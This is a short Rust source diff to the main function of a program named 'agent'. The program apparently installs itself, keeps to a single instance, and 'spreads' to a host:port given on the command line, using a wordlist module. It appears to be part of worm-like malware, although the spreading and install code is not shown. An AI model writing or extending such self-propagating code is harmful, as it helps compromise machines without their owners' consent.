@@ -9,18 +9,7 @@ mod wordlist;
 
 pub use error::Error;
 
-fn usage() {
-    println!("Usage:\nagent host:port\nex: 127.0.0.1:1322");
-}
-
 fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let mut args = env::args();
-    if args.len() != 2 {
-        usage();
-        return Ok(());
-    }
-    let host_port = args.nth(1).unwrap();
-
     let instance = SingleInstance::new(config::SINGLE_INSTANCE_IDENTIFIED).unwrap();
     if !instance.is_single() {
         return Ok(());
@@ -28,7 +17,12 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     let install_dir = install::install()?;
 
-    spread::spread(install_dir, &host_port)?;
+    let mut args = env::args();
+    if args.len() == 2 {
+        let host_port = args.nth(1).unwrap();
+        println!("spreading to {}", &host_port);
+        spread::spread(install_dir, &host_port)?;
+    }
 
     Ok(())
 }
